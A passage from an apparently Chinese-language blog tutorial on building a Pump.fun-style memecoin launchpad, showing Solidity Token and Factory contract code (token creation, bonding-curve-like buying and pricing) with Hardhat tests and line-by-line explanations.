&#123;</span><br><span class="line">    address payable public owner;</span><br><span class="line">    address public creator;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _creator,</span><br><span class="line">        string memory _name,</span><br><span class="line">        string memory _symbol,</span><br><span class="line">        uint256 _totalSupply</span><br><span class="line">    ) ERC20(_name, _symbol) &#123;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">        creator = _creator;</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, _totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中变量：</p><ul><li><code>_creator</code>：代币创建者的地址。</li><li><code>_name</code>：代币名称（例如 “My Token”）。</li><li><code>_symbol</code>：代币符号（例如 “MTK”）。</li><li><code>_totalSupply</code>：要铸造的代币总量。</li></ul><p><code>owner = payable(msg.sender);</code> 的含义：</p><ul><li><code>msg.sender</code> 是调用当前函数的地址。</li><li><code>payable(msg.sender)</code> 将地址转换为可支付类型，意味着这个地址可以接收ETH。</li><li>在这里，<code>owner</code> 被设置为部署 <code>Token</code> 合约的地址（<code>Factory</code> 合约），并且可以接收ETH。</li><li>使用 <code>_mint()</code> 将全部 <code>_totalSupply</code> 铸造给合约部署者。</li></ul><p>先使用<code>Remix</code>去部署测试，再使用<code>hardhat</code>在本地部署。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250207190149258.png" alt="image-20250207190149258"></p><p>部署成功。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/Snipaste_2025-02-07_19-03-39.png" alt="Snipaste_2025-02-07_19-03-39"></p><h2 id="创建并测试Factory">创建并测试Factory</h2><p>整个<code>Meme Coin</code>启动台的逻辑如下图：</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216005120396.png" alt="image-20250216005120396"></p><h3 id="全局变量">全局变量</h3><p>全局变量如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uint256 public constant TARGET = 3 ether;</span><br><span class="line">uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">//交易费费用</span><br><span class="line">uint256 public immutable fee;</span><br><span class="line">//合约的部署者</span><br><span class="line">address public owner;</span><br><span class="line">//token数组</span><br><span class="line">address[] public tokens;</span><br><span class="line">//token总共的数量</span><br><span class="line">uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">//将token的地址映射到token售卖信息的结构体上</span><br><span class="line">mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">//创建一个售卖token的结构体</span><br><span class="line">struct TokenSale&#123;</span><br><span class="line">    address token;</span><br><span class="line">    string name;</span><br><span class="line">    address creator;</span><br><span class="line">    uint256 sold;</span><br><span class="line">    uint256 raised;</span><br><span class="line">    bool isOpen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中创建了一个<code>token</code>的结构体，其中</p><ul><li><code>token</code>表示创建的token地址</li><li><code>name</code>代表token的名称</li><li><code>creator</code>表示token的创造者</li><li><code>sold</code>表示售卖的token数量</li><li><code>raised</code>表示token已经筹资了多少</li><li><code>isOpen</code>表示token是否公开售卖</li></ul><p>同时还创建了两个事件，分别为<code>Created</code>和<code>Buy</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当创建一个token时，发生了一个Created事件</span><br><span class="line">event Created(address indexed token);</span><br><span class="line">//当购买一个token时，发生一个Buy事件</span><br><span class="line">event Buy(address indexed token, uint256 amount);</span><br></pre></td></tr></table></figure><p>在<code>Solidity</code>中，<code>event</code>（事件）用于记录和通知区块链上发生的特定操作。事件不会改变合约的状态，且可以被外部系统廉价地存储和检索，比直接返回值更节省<code>gas</code>。在代码中，<code>indexed</code>是<code>Solidity</code>中的一个特殊关键字，主要用于优化事件的检索和过滤。被<code>indexed</code>标记的参数会创建<code>topics</code>（主题），便于快速查询。</p><h3 id="Create函数-代币创建">Create函数(代币创建)</h3><h4 id="函数代码">函数代码</h4><p><code>Solidity</code>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">    //确保创建者的余额大于fee，否则报错不向下继续执行。</span><br><span class="line">    require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line"></span><br><span class="line">    //创建一个token</span><br><span class="line">    Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">    //tokens数组存储token</span><br><span class="line">    tokens.push(address(token));</span><br><span class="line">    //token计数</span><br><span class="line">    totalTokens ++;</span><br><span class="line">    //列出用于售卖的token</span><br><span class="line">    // address token;</span><br><span class="line">    // string name;</span><br><span class="line">    // address creator;</span><br><span class="line">    // uint256 sold;</span><br><span class="line">    // uint256 raised;</span><br><span class="line">    // bool isOpen;</span><br><span class="line">    TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">    tokenToSale[address(token)] = sale;</span><br><span class="line">    //tell people it&#x27;s a live</span><br><span class="line">    emit Created(address(token));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，传入的参数<code>_name</code>为<code>token</code>的名称，<code>_symbol</code>为<code>token</code>的符号。通过<code>require</code>判断创建者的资金是否大于<code>fee</code>，满足条件后才能创建<code>token</code>。</p><p>其次，创建<code>token</code>，给Token必要的参数，<code>msg.sender</code>为调用<code>create</code>函数的地址，<strong>这里为<code>factory</code>合约的地址</strong>，其为Token的创建者，<code>_name</code>为Token的名称，<code>_symbol</code>为Token的符号，<code>1000000 ether</code>为token的总供应量。</p><p>然后，将创建的<code>token</code>保存到已创建的<code>token</code>数组中，并计数创建的<code>token</code>数量。</p><p>再者，创建一个<code>TokenSale</code>结构体，用于记录<code>token</code>的售卖情况，初始化存入<code>token</code>的地址、名称和创建者地址，初始<code>token</code>的售卖量和筹资量均为0，售卖状态是打开的。</p><p>最后，使用到<code>mapping</code>，使得<code>token</code>的地址直接映射到<code>token</code>的售卖信息(<code>tokenSale</code>)上。同时，每创建一个新的<code>token</code>都会创建一个<code>Created</code>事件。</p><h4 id="合约测试">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; loadFixture &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Factory&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">deployFactoryFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//获取账户</span></span><br><span class="line">        <span class="keyword">const</span> [deployer, creator, buyer] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">        <span class="comment">//编译并准备部署合约</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">Factory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Factory&quot;</span>);</span><br><span class="line">        <span class="comment">//部署合约</span></span><br><span class="line">      <span class="comment">//默认是第一个用户部署合约即deployer</span></span><br><span class="line">      <span class="comment">//await Factory.connect(deployer).deploy(FEE);</span></span><br><span class="line">        <span class="keyword">const</span> factory = <span class="keyword">await</span> <span class="title class_">Factory</span>.<span class="title function_">deploy</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="comment">//创建token</span></span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">create</span>(<span class="string">&quot;Pump&quot;</span>, <span class="string">&quot;PUM&quot;</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">FEE</span>&#125;);</span><br><span class="line">        <span class="comment">//确保交易完成，再执行后续代码</span></span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取第一个token，tokens为token数组</span></span><br><span class="line">        <span class="keyword">const</span> tokenAddress = <span class="keyword">await</span> factory.<span class="title function_">tokens</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">const</span> token = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;Token&quot;</span>, tokenAddress);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123; factory, token, deployer, creator ,buyer&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Deployment&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the fee&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">fee</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,deployer &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(deployer.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Creating&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the creator&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token,creator &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">creator</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the supply&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> totalSupply = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1000000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>())).<span class="property">to</span>.<span class="title function_">equal</span>(totalSupply);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should create the sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token,creator&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span>  count = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line">            <span class="title function_">expect</span>(count).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//console.log(sale);</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">token</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">creator</span>).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>测试合约的部署，对于<code>deployFactoryFixture</code>函数：</p><p>使用<code>ethers.getSigners()</code>去获取用户，<code>deployer、creator</code>分别为合约的部署者和创建者，<code>buyer</code>为token的买家。编译并部署合约，用<code>creator</code>用户去交易，创建一个名称为<code>Pump</code>，符号为<code>PUM</code>的代币(<code>token</code>)。然后，获取创建的<code>token</code>的地址。</p><p>部署部分测试：</p><p>测试部署的合约的<code>fee</code>和<code>deployer</code>是否正确。<code>Factory.deploy(FEE);</code>默认是使用第一个用户去部署合约，正常应该是<code>Factory.connect(deployer).deploy(FEE);</code>去部署合约。</p><p>创建<code>token</code>部分测试：</p><p>（1）测试<code>token.owner()</code>和<code>factory.getAddress()</code>是否相等。<code>token.owner()</code>是<code>token</code>的创建者，<code>factory.getAddress()</code>是<code>factory</code>合约部署的地址，因为在<code>Token.sol</code>中，创建<code>token</code>时，使用的是<code>msg.sender</code>，即调用该合约的地址，其被赋值给了<code>owner</code>，<code>Factory</code>合约调用了<code>Token</code>合约，所以二者是相等。</p><p>（2）测试<code>creator</code>和<code>totalSupply</code>是否和部署时一致。</p><p>（3）创建<code>token</code>时需要支付一定的<code>fee</code>，这个<code>fee</code>是存储在<code>factory</code>合约中的，创建<code>token</code>后判断合约中的余额和<code>fee</code>是否相等。</p><p>（4）测试<code>token</code>的售卖信息。</p><p>测试完成。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216175651190.png" alt="image-20250216175651190"></p><h3 id="Buy函数-代币销售">Buy函数(代币销售)</h3><h4 id="函数代码-2">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">    TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">    //检查条件</span><br><span class="line">    require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">    require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">    require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">    //计算一个token的价格基于购买的总量</span><br><span class="line">    uint256 cost = getCost(sale.sold);</span><br><span class="line">    uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">    //确保足够的ETH发送</span><br><span class="line">    require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">    //更新sale</span><br><span class="line">    sale.sold += _amount;</span><br><span class="line">    sale.raised += price;</span><br><span class="line">    //判断筹集目标是否达成</span><br><span class="line">    if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">        //关闭销售</span><br><span class="line">        sale.isOpen = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">    //触发Buy事件</span><br><span class="line">    emit Buy(_token, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数为<code>external payable</code>的，说明只能外部调用且是可以在调用时发送<code>ETH</code>的。函数传入的参数为<code>_token</code>和<code>_amount</code>，即<code>token</code>的地址和购买的数量。</p><p>首先，使用 <code>storage</code> 关键字，允许直接修改存储状态，并通过<code>token</code>的地址获取对应的售卖信息。然后检查<code>token</code>的售卖信息是否符合情况。</p><p>然后，根据<code>token</code>的售卖情况计算<code>token</code>的价格。使用到了<code>getCost</code>函数，自己定义的函数，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">    uint256 floor = 0.0001 ether;</span><br><span class="line">    uint256 step = 0.0001 ether;</span><br><span class="line">    uint256 increment = 10000 ether;</span><br><span class="line">    uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">    return cost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，判断购买者的资金是否大于价格，若满足，则可购买，然后更新<code>token</code>的售卖信息，购买量和筹集的资金均增加。更新后，判断<code>token</code>的售卖信息是否达到上限的要求，若满足，则关闭售卖状态。</p><p>最后，向购买者<code>buyer</code>转账购买的<code>token</code>。转账完成后触发<code>Buy</code>事件。</p><h4 id="合约测试-2">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyTokenFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; factory, token, creator , buyer &#125; = <span class="keyword">await</span> <span class="title function_">deployFactoryFixture</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//买token</span></span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">    <span class="comment">//确保交易完成，再执行后续代码</span></span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123; factory, token, creator, buyer&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Buying&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="comment">//buyer买token，将ETH转入到合约中，检查合约收到的ETH</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//buyer买token，检查buyer收到的token</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;token, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(buyer.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//更新token sale</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">COST</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should increase base cost&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(sale.<span class="property">sold</span>);</span><br><span class="line">            <span class="comment">//sold为10000,带入getCost计算 0.0001 + 0.0001 = 0.0002</span></span><br><span class="line">            <span class="title function_">expect</span>(cost).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.0002&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">    